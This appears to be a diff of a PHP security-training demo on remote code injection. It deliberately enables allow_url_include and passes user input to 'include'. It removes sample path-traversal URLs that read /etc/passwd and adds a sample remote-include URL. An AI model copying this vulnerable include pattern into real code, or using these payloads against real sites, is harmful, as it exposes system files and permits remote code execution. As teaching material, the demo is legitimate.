@@ -1,13 +1,14 @@
 <?php
-// FILE: prevent_remote_injection_include_bad.php
+// FILE: prevent_remote_injection_php_ini.php
 
 // preventing remote code injection attacks
+// this demo simulates having the "allow_url_include" php.ini setting turned on
 // the vulnerability exists when user input is mixed with one of the "include" commands
-// the problem is even worse if unrestricted file uploads are allowed!
 
-/*
- * NOTE: for demo to work, make sure "include" folder is writeable by PHP
- */
+// simulates php.ini allow_url_* settings turned on
+ini_set('allow_url_fopen', 1);
+// NOTE: most recent PHP installations are compiled with allow_url_include disabled!
+ini_set('allow_url_include', 1);
 
 // initialize all variables
 $header 	= '';
@@ -24,7 +25,7 @@ include $command;
 <title>Prevent Code Injection</title>
 </head>
 <body>
-<h1>prevent_remote_injection_include_bad.php</h1>
+<h1>prevent_remote_injection_php_ini.php</h1>
 
 <br />
 <h3><?php echo htmlspecialchars($header); ?></h3>
@@ -36,11 +37,10 @@ include $command;
 </ul>
 
 <br />
-Try these URLs:
-<ul>
-<li>For Linux or Mac: <pre>prevent_remote_injection_include_bad.php?cmd=../../../../../../../../etc/passwd</pre></li>
-<li>For Windows (assuming c:\xampp): <pre>prevent_remote_injection_include_bad.php?cmd=../../properties.ini</pre></li>
-</ul>
+Try this URL:
+<pre>
+prevent_remote_injection_php_ini.php?cmd=http://localhost/verybadwebsite/info.php
+</pre>
 
 <p>
 <?php echo $content; ?>
